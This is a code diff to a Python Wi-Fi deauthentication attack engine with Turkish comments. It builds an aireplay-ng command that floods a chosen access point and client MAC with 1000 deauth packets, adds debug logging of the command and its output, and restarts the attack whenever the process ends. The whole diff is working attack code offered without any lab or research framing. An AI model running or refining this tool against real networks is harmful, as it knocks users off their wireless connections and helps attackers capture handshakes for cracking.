@@ -131,38 +131,68 @@ class DeauthEngine:
             target.start_time = datetime.now()
             logger.info(f"Starting attack on {target.client_mac}")
             
-            # Build aireplay-ng command
+            # Build aireplay-ng command - DİNAMİK INTERFACE
             cmd = [
                 'aireplay-ng',
-                '--deauth', '0',  # Continuous deauth
+                '--deauth', '1000',  # 1000 paket (0 yerine sayı kullan)
                 '-a', target.ap_bssid,  # AP BSSID
                 '-c', target.client_mac,  # Client MAC
-                self.interface
+                self.interface  # Dinamik interface (wlan0mon, wlan0, vb.)
             ]
             
-            # Start aireplay-ng process
+            # DEBUG: Log command
+            logger.info(f"Deauth command: {' '.join(cmd)}")
+            console.print(f"[dim]🔍 DEBUG: Komut: {' '.join(cmd)}[/dim]")
+            
+            # Start aireplay-ng process - STDOUT/STDERR'ı GÖR
             target.process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
+                stderr=subprocess.STDOUT,  # stderr'ı stdout'a yönlendir
+                text=True,
+                bufsize=1  # Line buffered
             )
             
             # Monitor process output
             while self.is_attacking and target.process:
                 try:
                     # Check if process is still running
-                    if target.process.poll() is not None:
-                        # Process ended, restart it
-                        logger.warning(f"Process ended for {target.client_mac}, restarting...")
-                        time.sleep(1)
+                    poll_result = target.process.poll()
+                    
+                    if poll_result is not None:
+                        # Process ended
+                        logger.warning(f"Process ended for {target.client_mac} with code {poll_result}")
                         
-                        target.process = subprocess.Popen(
-                            cmd,
-                            stdout=subprocess.PIPE,
-                            stderr=subprocess.PIPE,
-                            text=True
-                        )
+                        # Read any remaining output
+                        if target.process.stdout:
+                            output = target.process.stdout.read()
+                            if output:
+                                logger.info(f"Process output: {output}")
+                                console.print(f"[dim]🔍 DEBUG: aireplay-ng çıktı: {output[:200]}[/dim]")
+                        
+                        # Restart if attack still active
+                        if self.is_attacking:
+                            logger.info(f"Restarting attack on {target.client_mac}...")
+                            time.sleep(1)
+                            
+                            target.process = subprocess.Popen(
+                                cmd,
+                                stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT,
+                                text=True,
+                                bufsize=1
+                            )
+                    else:
+                        # Process still running, read output
+                        if target.process.stdout:
+                            try:
+                                import select
+                                if select.select([target.process.stdout], [], [], 0)[0]:
+                                    line = target.process.stdout.readline()
+                                    if line:
+                                        logger.debug(f"aireplay-ng: {line.strip()}")
+                            except:
+                                pass
                     
                     # Update packet count (estimate)
                     elapsed = (datetime.now() - target.start_time).total_seconds()
